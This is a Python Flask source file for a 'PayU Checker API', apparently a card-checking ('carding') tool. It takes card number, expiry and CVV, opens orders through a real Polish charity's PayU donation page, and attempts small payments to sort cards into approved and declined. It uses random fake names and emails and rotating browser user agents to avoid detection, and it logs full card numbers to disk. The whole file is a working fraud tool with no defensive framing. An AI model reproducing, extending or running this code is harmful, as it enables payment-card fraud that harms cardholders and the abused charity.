# payu_api.py
from flask import Flask, request, jsonify
import requests
import re
import json
import time
import random
import string
import os
from datetime import datetime

app = Flask(__name__)

# Create responses directory
RESPONSES_DIR = "payu_responses"
if not os.path.exists(RESPONSES_DIR):
    os.makedirs(RESPONSES_DIR)

def random_name():
    first_names = ["John", "James", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles",
                   "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Barbara", "Susan", "Jessica", "Sarah", "Karen",
                   "Daniel", "Matthew", "Anthony", "Mark", "Donald", "Steven", "Paul", "Andrew", "Joshua", "Kenneth"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez",
                  "Hernandez", "Lopez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee"]
    return f"{random.choice(first_names)} {random.choice(last_names)}"

def random_email():
    chars = string.ascii_lowercase + string.digits
    user = ''.join(random.choices(chars, k=10))
    return f"{user}@gmail.com"

def random_ua():
    versions = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Edg/137.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    ]
    return random.choice(versions)

def parse_cc(cc_line):
    cc = cc_line.strip()
    if '|' in cc:
        parts = cc.split('|')
        return {
            'number': parts[0].strip(),
            'month': parts[1].strip(),
            'year': parts[2].strip(),
            'cvv': parts[3].strip()
        }
    return None

def save_response(card_number, result):
    """Save response to file"""
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"{RESPONSES_DIR}/payu_{card_number[-4:]}_{timestamp}.txt"
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"Card: {card_number}\n")
        f.write(f"Timestamp: {datetime.now().isoformat()}\n")
        f.write(f"Status: {result.get('status', 'UNKNOWN')}\n")
        f.write(f"Message: {result.get('message', 'N/A')}\n")
        f.write(f"Response: {json.dumps(result, indent=2)}\n")
        f.write("-" * 50 + "\n")
    
    return filename

def poll_status(order_id, token, max_attempts=10, delay=3):
    session = requests.Session()
    ua = random_ua()
    headers = {
        'accept': '*/*',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': f'Bearer {token}',
        'priority': 'u=1, i',
        'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
        'sec-ch-ua': '"Mises";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': ua,
    }
    
    for i in range(max_attempts):
        time.sleep(delay)
        r = session.get(f'https://secure.payu.com/api/front/orders/{order_id}/status', headers=headers)
        
        try:
            data = r.json()
        except:
            try:
                data = json.loads(r.text)
            except:
                data = {"raw": r.text, "status_code": r.status_code}
        
        category = data.get('category')
        
        if category != 'IN_PROGRESS' and category != 'NEW':
            return data
        
        if i == max_attempts - 1:
            return data
    
    return data

def run_check(cc_info):
    session = requests.Session()
    card_number = cc_info['number']
    card_month = cc_info['month']
    card_year = cc_info['year']
    card_cvv = cc_info['cvv']
    email = random_email()
    ua = random_ua()
    name = random_name()
    
    if len(card_year) == 2:
        card_year = '20' + card_year
    
    headers1 = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://fundacjakukuczki.pl',
        'priority': 'u=0, i',
        'referer': 'https://fundacjakukuczki.pl/en/donations/payu/',
        'sec-ch-ua': '"Mises";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': ua,
    }
    
    data1 = {
        'name': name,
        'email': email,
        'amount': '1',
        'purpose': 'Pomoc Dariuszowi Glince',
    }
    
    r1 = session.post('https://fundacjakukuczki.pl/payu-darowizna.php', headers=headers1, data=data1, allow_redirects=False)
    
    order_id = None
    token = None
    
    if 'Location' in r1.headers:
        loc = r1.headers['Location']
        oid = re.search(r'orderId=([^&]+)', loc)
        tok = re.search(r'token=([^&]+)', loc)
        if oid: order_id = oid.group(1)
        if tok: token = tok.group(1)
    
    if not order_id or not token:
        body = r1.text
        oid = re.search(r'orderId["\']?\s*[:=]\s*["\']?([^"&\s\'>]+)', body)
        tok = re.search(r'token["\']?\s*[:=]\s*["\']?([^"&\s\'>]+)', body)
        if oid and not order_id: order_id = oid.group(1)
        if tok and not token: token = tok.group(1)
    
    if not order_id or not token:
        return {
            'status': 'ERROR',
            'message': 'Failed to extract orderId or token',
            'card': card_number
        }
    
    params2 = {
        'orderId': order_id,
        'token': token,
    }
    
    headers2 = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'priority': 'u=0, i',
        'referer': 'https://fundacjakukuczki.pl/',
        'sec-ch-ua': '"Mises";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': ua,
    }
    
    r2 = session.get('https://secure.payu.com/pay/', params=params2, headers=headers2)
    
    headers3 = {
        'accept': '*/*',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': f'Bearer {token}',
        'content-type': 'application/json',
        'origin': 'https://secure.payu.com',
        'priority': 'u=1, i',
        'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
        'sec-ch-ua': '"Mises";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': ua,
    }
    
    json3 = {
        'posId': 'PAYU S.A.',
        'type': 'SINGLE',
        'card': {
            'number': card_number,
            'cvv': card_cvv,
            'expirationMonth': card_month,
            'expirationYear': card_year,
        },
    }
    
    r3 = session.post('https://secure.payu.com/api/front/tokens', headers=headers3, json=json3)
    
    try:
        token_data = r3.json()
    except:
        try:
            token_data = json.loads(r3.text)
        except:
            token_data = {"raw": r3.text, "status_code": r3.status_code}
    
    card_token = token_data.get('value')
    
    if not card_token:
        return {
            'status': 'ERROR',
            'message': 'Failed to tokenize card',
            'card': card_number,
            'response': token_data
        }
    
    masked = card_number[:6] + '*' * 6 + card_number[-4:]
    
    json4 = {
        'email': email,
        'firstName': name.split()[0] if ' ' in name else name,
        'lastName': name.split()[1] if ' ' in name else '',
        'currency': 'USD',
        'amount': 28,
        'payMethod': {
            'type': 'c',
            'token': card_token,
            'cardDetails': {
                'maskedCardNumber': masked,
            },
        },
        'metadata': {
            'cardInputTime': 9039,
        },
        'redirectUrl': f'https://secure.payu.com/pay/?orderId={order_id}&token=%token%',
        'mcpFxTableId': 588817,
        'mcpFxRate': 3.5229,
        'browserData': {
            'screenWidth': 800,
            'javaEnabled': False,
            'timezoneOffset': -330,
            'screenHeight': 1280,
            'userAgent': ua,
            'colorDepth': 24,
            'language': 'en-IN',
            'challengeWindowSize': '04',
        },
        'language': 'en',
        'invoice': None,
    }
    
    r4 = session.post(f'https://secure.payu.com/api/front/orders/{order_id}/payments', headers=headers3, json=json4)
    
    try:
        pay_data = r4.json()
    except:
        try:
            pay_data = json.loads(r4.text)
        except:
            pay_data = {"raw": r4.text, "status_code": r4.status_code}
    
    continue_url = pay_data.get('continueUrl')
    error_code = pay_data.get('errorCode')
    
    if error_code:
        result = {
            'status': 'DECLINED',
            'message': f'Payment error: {error_code}',
            'card': card_number,
            'response': pay_data
        }
        save_response(card_number, result)
        return result
    
    final_status = poll_status(order_id, token, max_attempts=10, delay=3)
    
    category = final_status.get('category')
    value = final_status.get('value')
    
    if category == 'SUCCESS':
        result = {
            'status': 'APPROVED',
            'message': 'Payment Successful',
            'card': card_number,
            'response': final_status
        }
    elif category == 'ERROR':
        result = {
            'status': 'DECLINED',
            'message': f'Payment declined: {value}',
            'card': card_number,
            'response': final_status
        }
    else:
        result = {
            'status': category or 'UNKNOWN',
            'message': f'Payment status: {value}',
            'card': card_number,
            'response': final_status
        }
    
    save_response(card_number, result)
    return result

@app.route('/payu', methods=['GET'])
def payu_check():
    cc_param = request.args.get('cc')
    
    if not cc_param:
        return jsonify({
            "error": "Missing cc parameter",
            "usage": "/payu?cc=card_number|mm|yy|cvv",
            "example": "/payu?cc=4003449949393225|11|27|730"
        }), 400
    
    cc_info = parse_cc(cc_param)
    
    if not cc_info:
        return jsonify({
            "error": "Invalid format. Expected: card_number|mm|yy|cvv"
        }), 400
    
    # Process the check
    result = run_check(cc_info)
    
    # Return response
    return jsonify({
        "Card": result.get('card'),
        "Status": result.get('status'),
        "Message": result.get('message')
    })

@app.route('/health', methods=['GET'])
def health():
    return "OK", 200

@app.route('/', methods=['GET'])
def index():
    return jsonify({
        "service": "PayU Checker API",
        "endpoint": "/payu?cc=card|mm|yy|cvv",
        "example": "/payu?cc=4003449949393225|11|27|730"
    }), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5006, debug=False)
